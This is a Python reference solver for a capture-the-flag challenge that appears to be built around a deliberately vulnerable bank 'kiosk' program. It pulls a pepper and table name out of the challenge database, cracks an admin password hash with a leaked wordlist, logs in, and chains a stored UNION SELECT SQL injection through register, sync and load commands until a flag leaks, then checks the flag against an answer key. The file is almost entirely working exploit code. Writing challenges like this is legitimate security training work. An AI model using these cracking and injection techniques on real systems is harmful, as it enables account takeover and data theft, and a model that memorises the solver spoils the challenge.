#!/usr/bin/env python3
"""M01 reference solver (participant-reproducible).

Drives the real kiosk binary -- nothing is hard-coded except the layer recipe:

1. Read fleeca.db to pull the DB-bound secrets: the server pepper, the session
   key and the destination ledger name (config.core_ledger).
2. Crack the honeypot admin's weak password from the leaked wordlist against
   the custom hash (per-user salt + pepper + reversed username).
3. Authenticate via `login` so a valid HMAC session token exists (gate A).
4. Register a username carrying an SQLi payload, `sync` it so the *derived*
   alias is the value actually stored, then `load` it. A single-stage
   register+load does nothing; the two stored operations are mandatory.
5. The stored alias is interpolated raw into the vault query (gate B), so the
   union reaches the real ledger and leaks the base64 secret, which the kiosk
   decodes on display.
"""
import hashlib
import re
import shutil
import sqlite3
import subprocess
import sys
import tempfile
from pathlib import Path

sys.path.insert(0, r"d:\ctf\FLAG_THEFT_AUTO_FINAL\rebuild_workspace")
import lib_fta as L

SRC = L.out_dir("M01")
HASH_TAG = "fleeca-h2"
HONEYPOT_USER = "admin"


def custom_hash(password: str, username: str, salt: str, pepper: str) -> str:
    material = f"{HASH_TAG}|{salt}|{password}|{username[::-1]}|{pepper}"
    return hashlib.sha256(material.encode()).hexdigest()[:20]


def _db_secrets(db: Path):
    con = sqlite3.connect(db)
    cfg = dict(con.execute("SELECT key, value FROM config").fetchall())
    row = con.execute(
        "SELECT pw_salt, pw_hash FROM users WHERE username = ?", (HONEYPOT_USER,)
    ).fetchone()
    con.close()
    assert row, "honeypot account missing from fleeca.db"
    return cfg, row[0], row[1]


def _recover_password(pw_hash: str, salt: str, pepper: str, words) -> str:
    for word in words:
        if custom_hash(word, HONEYPOT_USER, salt, pepper) == pw_hash:
            return word
    raise AssertionError("admin password not found in common_pw.txt")


def solve() -> str:
    # Run against a throwaway copy so the shipped artifacts stay pristine.
    work = Path(tempfile.mkdtemp(prefix="m01_"))
    try:
        for name in ("fleeca.db", "fleeca_kiosk.py"):
            shutil.copy(SRC / name, work / name)

        cfg, salt, admin_hash = _db_secrets(work / "fleeca.db")
        pepper = cfg["server_pepper"]
        ledger = cfg["core_ledger"]              # destination table name (DB-driven)
        words = (SRC / "common_pw.txt").read_text(encoding="utf-8").split()
        admin_pw = _recover_password(admin_hash, salt, pepper, words)

        def kiosk(*args):
            r = subprocess.run(
                [sys.executable, str(work / "fleeca_kiosk.py"), *args],
                capture_output=True, text=True,
            )
            return r.stdout

        # Gate A: satisfy the HMAC session gate via the cracked credential.
        assert "welcome back" in kiosk("login", HONEYPOT_USER, admin_pw), "auth layer not solved"

        # Stage 1: store the payload username (parameterized).
        # Stage 2: `sync` stores the derived alias (the only value load trusts).
        # Stage 3: `load` interpolates the alias raw -> union into the real ledger.
        payload = f"x' UNION SELECT owner, secret FROM {ledger} WHERE '1'='1"
        kiosk("register", payload, "x")
        # A single-stage register+load must NOT reach the vault.
        assert "alias not synced" in kiosk("load", payload), "single-stage payload unexpectedly worked"
        kiosk("sync", payload)
        out = kiosk("load", payload)
        m = re.search(r"FTA\{[a-z0-9_]+\}", out)
        assert m, f"no flag leaked; kiosk output:\n{out}"
        return m.group(0)
    finally:
        shutil.rmtree(work, ignore_errors=True)


def check(candidate: str) -> None:
    assert candidate == L.FLAGS["M01"], f"wrong flag rejected: {candidate!r}"


if __name__ == "__main__":
    flag = solve()
    check(flag)
    print("[M01] PASS ->", flag)
